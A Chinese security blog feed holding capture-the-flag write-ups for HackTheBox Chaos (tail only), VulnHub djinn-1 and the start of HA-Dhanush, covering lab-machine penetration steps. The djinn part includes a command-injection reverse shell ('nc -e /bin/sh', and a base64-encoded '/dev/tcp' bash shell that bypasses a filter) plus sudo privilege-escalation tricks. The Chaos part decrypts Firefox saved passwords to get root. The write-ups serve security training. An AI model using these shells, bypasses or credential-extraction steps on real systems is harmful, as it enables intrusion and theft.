</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/763.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/764.png" alt="图片"></p><p>最后我们在 <code>Github</code> 上找到有一个脚本可以解出<code>firefox</code>的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/unode/firefox_decrypt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/765.png" alt="图片"></p><p>我们先把刚刚的 <code>fox</code> 解压到当前目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf fox.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/766.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/767.png" alt="图片"></p><p>Copy 成功后，我们就可以运行脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python firefox_decrypt.py ~/.mozilla/firefox/bzo7sjt1.default</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/768.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Master Password for profile /root/.mozilla/firefox/bzo7sjt1.default: </span><br><span class="line"></span><br><span class="line">Website:   https://chaos.htb:10000</span><br><span class="line">Username: &#x27;root&#x27;</span><br><span class="line">Password: &#x27;Thiv8wrej~&#x27;</span><br></pre></td></tr></table></figure><p>这个时候得到了 <code>root</code> 账号和密码：<code>Thiv8wrej~</code>，我们切换一下账号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">password：Thiv8wrej~</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/769.png" alt="图片"></p><p>最终来到 <code>/root</code> 目录下，查看 <code>root.txt</code> 得到 <code>flag</code> ！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@chaos:~<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">4eca7e09e3520e020884563cfbabbc70</span><br></pre></td></tr></table></figure><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这次呢，先是通过信息搜集发现了一个<code>wordpress</code>的页面，页面中有一篇文章是有密码的。</p><p>通过社工的手段和<code>BurpSuite</code>得到了文章密码，进入文章页面后发现里面泄露了一个邮箱的账号和密码，之后登陆邮箱发现里面有两个附件，通过解密出来附件中的内容得到一个web页面。而这个Web页面是一个创建<code>PDF</code>的编辑器叫做： <code>LaTeX</code>编辑器，我通过<code>Pdflatex</code>手段我们利用<code>nc</code>的<code>python</code>代码得到了一枚<code>shell</code>。</p><p>然后通过<code>Linux</code>受限我们绕过了不能执行<code>shell</code>命令的限制，后来又发现<code>ayush</code>用户安装了<code>火狐浏览器</code>（Firefox），最终是通过<code>python</code>脚本解出了<code>Firefox</code>的用户凭证得到了<code>root</code>密码，拿到<code>Flag</code>！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-djinn-1_一次Fuzz渗透测试拿到Flag</title>
      <link href="/2019/12/02/djinn-1/"/>
      <url>/2019/12/02/djinn-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=523248511&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/666.png" alt="图片"></p><p>HackTheName：djinn：1<br>难度：中等<br>flags: user.txt and root.txt<br>Description: The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You’ll see the IP right on the login screen. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively.<br>Format: Virtual Machine (Virtualbox - OVA)<br>Operating System: Linux</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机后，显示 IP：<code>192.168.136.142</code>，好方便，这样就不用我们扫内网主机存活了。</p><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>先探测一下开放了那些端口吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- A 192.168.136.142</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/667.png" alt="图片"></p><p>它开放了<code>21</code>,<code>1337</code>,<code>7331</code>端口！我们先来看看<code>1377</code>端口吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.136.142:1377</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/668.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Let<span class="string">&#x27;s see how good you are with simple maths</span></span><br><span class="line"><span class="string">Answer my questions 1000 times and I&#x27;</span>ll give you your gift.</span><br><span class="line">(4, <span class="string">&#x27;-&#x27;</span>, 2)</span><br><span class="line">&gt; Stop acting like a hacker <span class="keyword">for</span> a damn minute!!</span><br><span class="line">curl: (56) Recv failure: Connection reset by peer</span><br></pre></td></tr></table></figure><p>翻译过来的意思就是：让我们看看您的简单数学成绩如何，回答我的问题1000次，我会给你礼物。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/669.png" alt="图片"></p><p>我们先使用<code>Nc</code>建立一个连接看看吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.136.142 1337</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/670.png" alt="图片"></p><p>这是一个加减乘除游戏？我…，作为一个Hacker，我感觉我的智商被侮辱了，我关闭了shell窗口。继续看下一个端口7331:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.136.142:7331</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/671.png" alt="图片"></p><p>这边返回的是一个<code>HTML</code>页面，说明是一个网页，那么我们浏览器打开看看：</p><blockquote><p>192.168.136.142:7331</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/672.png" alt="图片"></p><h2 id="Web渗透命令执行"><a href="#Web渗透命令执行" class="headerlink" title="Web渗透命令执行"></a>Web渗透命令执行</h2><p>进入到Web页面，发现没有什么可以利用的地方，连个交互的地方都没得。我们还是先来枚举一下目录看看吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.136.142:7331</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/673.png" alt="图片"></p><p>得出了两个文件：<code>genie</code>、<code>wish</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.136.142:7331/ ----</span><br><span class="line">+ http://192.168.136.142:7331/genie (CODE:200|SIZE:1676)                       </span><br><span class="line">+ http://192.168.136.142:7331/wish (CODE:200|SIZE:385) </span><br></pre></td></tr></table></figure><p>访问 <code>http://192.168.136.142:7331/genie</code> 发现是<code>403</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/674.png" alt="图片"></p><p>那么我们继续扫描<code>genie</code>下的目录和文件，在扫描过程中我们在看看<code>wish</code>目录：</p><blockquote><p><a href="http://192.168.136.142:7331/wish">http://192.168.136.142:7331/wish</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/675.png" alt="图片"></p><p>发现是一个提交表单，上面显示：Oh you found me then go on make a wish.This can make all your wishes come true，翻译过来的意思就是：哦，你找到我，然后继续许个愿。这可以使您的所有愿望成真！<br>emmm，我的愿望是让我变得有钱…</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/676.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/677.png" alt="图片"></p><p>提交后显示 <code>403</code>？说好实现我的愿望呢？你个骗纸！！！</p><p>咳咳，我们继续回到正题，既然是一个表单，我第一时间想到了<code>XSS</code>、<code>SQL</code>注入，但是这玩意是个静态的页面，也没用啊?后来随手输入了一个<code>ifconfig</code>，结果返回了<code>ip</code>的信息：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/678.png" alt="图片"></p><h2 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h2><p>原来是一个<code>命令执行</code>啊，那么就掏出<code>Netcat</code>来弹个<code>shell</code>回来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KALI上监听：nc -lvvp 6666</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/679.png" alt="图片"></p><p>然后在表单提交框提交nc命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.136.138</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/680.png" alt="图片"></p><p>提交后发现KALI监听没反应：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/681.png" alt="图片"></p><p>估计是它做了一些限制，后来<code>FUZZ</code>了一下，它能够执行<code>ifconfig</code>、<code>id</code>、<code>whoami</code>、<code>echo</code>这些普通命令，但是你执行一些其他的就不成功！这个时候就难了，最后想到利用编码来绕过一下，既然明文是不行的，那么编码后应该就可以了？我们来看看使用<code>base64</code>编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编码前：nc -e /bin/sh 192.168.136.138</span><br><span class="line">编码后：bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEzNi4xMzg=</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/682.png" alt="图片"></p><p>然后我们通过管道来让他分别执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNi4xMzgvNjY2NiAwPiYx | base64 -d | bash</span><br><span class="line">其中加密的base64的内容是：bash -i &gt;&amp; /dev/tcp/192.168.136.138/6666 0&gt;&amp;1</span><br><span class="line">意思就是使用<span class="built_in">echo</span> 输出一段base64加密的内容，然后通过管道（|）来继续执行base64 -d解码后的base64最后再执行bash命令</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/683.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/684.png" alt="图片"></p><p>这个时候就反弹回来一枚shell！然后查看一下当前权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/685.png" alt="图片"></p><p>发现只是一个普通的data网站权限，没啥用，我们翻一下目录文件吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/686.png" alt="图片"></p><p>结果没啥文件，那个<code>app.py</code>是刚刚侮辱我知识的加减乘除游戏代码，接着我来到<code>/home</code>下看看有那些用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/687.png" alt="图片"></p><p>发现有<code>nitish</code>、<code>sam</code>两个用户！我们先去到<code>nitish</code>目录下看看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> nitish</span><br><span class="line">发现有一个user.txt文件，我们cat查看了一下发现没有啥东西</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/688.png" alt="图片"></p><p>我们继续翻文件，发现了一个<code>creds.txt</code>的文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/689.png" alt="图片"></p><p>而<code>creds.txt</code>内容应该就是密码了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nitish:p4ssw0rdStr3r0n9</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>但是有个问题，它<code>22</code>端口没开放…我<code>ssh</code>也进不去啊，那可咋整？既然这服务器里有<code>python</code>脚本，那么就肯定是有<code>python</code>环境的，那么我们就可以利用<code>bash</code>来调用<code>python</code>执行代码反弹一shell，最后再使用<code>su</code>来登陆到<code>nitish</code>这个用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">nitish:p4ssw0rdStr3r0n9</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/690.png" alt="图片"></p><p>成功切换到<code>nitish</code>用户，那么习惯性的看看可以执行那些<code>root</code>权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/691.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genie -h</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/692.png" alt="图片"></p><p>先是简单看了一下<code>genie</code>的参数有那些，这命令比较陌生，原来这玩意是一个二进制文件？<br>然后使用<code>man</code>来查看了一下<code>genie</code>的帮助信息：<code>man /usr/bin/genie</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">nitish@djinn:~/.dev$ man /usr/bin/genie</span><br><span class="line">man /usr/bin/genie</span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">-  (press RETURN)</span><br><span class="line"></span><br><span class="line">man(8)                          genie man page                          man(8)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       genie - Make a wish</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       genie would complete all your wishes, even the naughty ones.</span><br><span class="line"></span><br><span class="line">       We  all  dream  of getting those crazy privelege escalations, this will</span><br><span class="line">       even <span class="built_in">help</span> you acheive that.</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line">       wish</span><br><span class="line"></span><br><span class="line">              This is the wish you want to make .</span><br><span class="line"></span><br><span class="line">       -g, --god</span><br><span class="line"></span><br><span class="line">              Sometime we all would like to make a wish to  god,  this  option</span><br><span class="line"> Manual page genie(8) line 1 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line">              <span class="built_in">let</span> you make wish directly to God;</span><br><span class="line"> Manual page genie(8) line 2 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line"></span><br><span class="line"> Manual page genie(8) line 3 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line">              Though  genie can<span class="string">&#x27;t gurantee you that your wish will be heard by</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 4 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">              God, he&#x27;</span>s a busy man you know;</span><br><span class="line"> Manual page genie(8) line 5 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line"></span><br><span class="line"> Manual page genie(8) line 6 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line">       -p, --shell</span><br><span class="line"> Manual page genie(8) line 7 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line"></span><br><span class="line"> Manual page genie(8) line 8 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line">              Well who doesn<span class="string">&#x27;t love those. You can get shell. Ex: -p &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 9 (press h for help or q to quit)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Manual page genie(8) line 10 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">       -e, --exec</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 11 (press h for help or q to quit)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Manual page genie(8) line 12 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">              Execute command on someone else computer is just too  damn  fun,</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 13 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">              but this comes with some restrictions.</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 14 (press h for help or q to quit)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Manual page genie(8) line 15 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">       -cmd</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 16 (press h for help or q to quit)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Manual page genie(8) line 17 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">              You know sometime all you new is a damn CMD, windows I love you.</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 18 (press h for help or q to quit)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Manual page genie(8) line 19 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">SEE ALSO</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 20 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">       mzfr.github.io</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 21 (press h for help or q to quit)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Manual page genie(8) line 22 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">BUGS</span></span><br><span class="line"><span class="string"> Manual page genie(8) line 23 (press h for help or q to quit)</span></span><br><span class="line"><span class="string">       There  are  shit  loads  of bug in this program, it&#x27;</span>s all about finding</span><br><span class="line"> Manual page genie(8) line 24 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line">       one.</span><br><span class="line"> Manual page genie(8) line 25 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line"></span><br><span class="line"> Manual page genie(8) line 26 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line">AUTHOR</span><br><span class="line"> Manual page genie(8) line 27 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line">       mzfr</span><br><span class="line"> Manual page genie(8) line 28 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line"></span><br><span class="line"> Manual page genie(8) line 29 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line">1.0                            11 November 2019                         man(8)</span><br><span class="line"> Manual page genie(8) line 30 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br><span class="line"> Manual page genie(8) line 30/52 (END) (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)</span><br></pre></td></tr></table></figure><p>发现了一个隐藏的信息：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/693.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -p <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">尝试了一下 -p 参数，发现并没有返回shell</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/694.png" alt="图片"></p><p>然后我试了试<code>cmd</code>，结果反弹回了<code>sam</code>的shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u sam genie -cmd id</span><br><span class="line">这段代码的意思是：使用sudo -u来指定sam用户来调用genie来执行-cmd参数执行id命令</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/695.png" alt="图片"></p><p>还是老规矩，看看<code>sam</code>有那些<code>root</code>执行的权限命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/696.png" alt="图片"></p><p>执行了<code>sudo /root/lago</code>之后，当时我表示没看懂，真没看懂！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/697.png" alt="图片"></p><p>后来经过<code>FUZZ</code>发现第<code>2</code>，输入<code>num</code>就可以得到<code>shell</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /root/lago</span><br><span class="line">2</span><br><span class="line">num</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/698.png" alt="图片"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>先是通过<code>Nmap</code>扫描出了一些服务，<code>FTP</code>、<code>HTTP</code>，然后在web中发现了<code>命令执行</code>，使用<code>NC</code>反弹得到了一个shell，接着是找到了一个用户的密码，最终使用<code>FUZZ</code>得到了Root权限！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-HA-Dhanush，一次通过SSH爆破艰难的更换SSH用户,最后使用ZIP提权拿到Root权限</title>
      <link href="/2019/12/01/HA-Dhanush/"/>
      <url>/2019/12/01/HA-Dhanush/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=5041667&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/645.png" alt="图片"></p><p>HackTheName:HA-Dhanush<br>The Dhanush once was the pinnacle of the weapons technology. It redefined the warfare to a new level and is mentioned in all the Mythological Accounts in the History. Choose Your Dhanush, Stretch the string and Shoot for Root!! ENUMERATION IS THE KEY!!!!!<br>下载地址：<a href="https://www.vulnhub.com/entry/ha-dhanush,396/">https://www.vulnhub.com/entry/ha-dhanush,396/</a><br>难度：中等<br>目的：拿到 Root 权限<br>攻击机器KALI：192.168.136.138</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>在拿到靶机在<code>VMware</code>虚拟机运行后。我们得知道靶机的IP是多少，使用<code>netdiscover</code>命令来查看当前网络中存活主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/646.png" alt="图片"></p><p>经过探测得知目标靶机的<code>IP</code>为<code>192.168.136.141</code>。现在有了IP地址，那么还是老规矩，扫扫端口看看开放了那些服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A -O 192.168.136.141</span><br><span class="line">-p-：是扫描从1-65535的所有端口</span><br><span class="line">-A：探测操作系统版本</span><br><span class="line">-O：探测所使用的操作系统</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/647.png" alt="图片"></p><p>从上图得知，它开放了<code>80</code>（http）、<code>65345</code>（SSH）端口，论扫描端口的重要性！它把<code>SSH</code>端口更改为<code>65345</code>了，所使用的操作系统是<code>Ubuntu</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure><p>访问：<code>http://192.168.136.141</code> 发现<code>Web</code>网页中没得啥可以利用的地方，只有一段我看不懂的文字，好像是马拉地语？</p><p><img 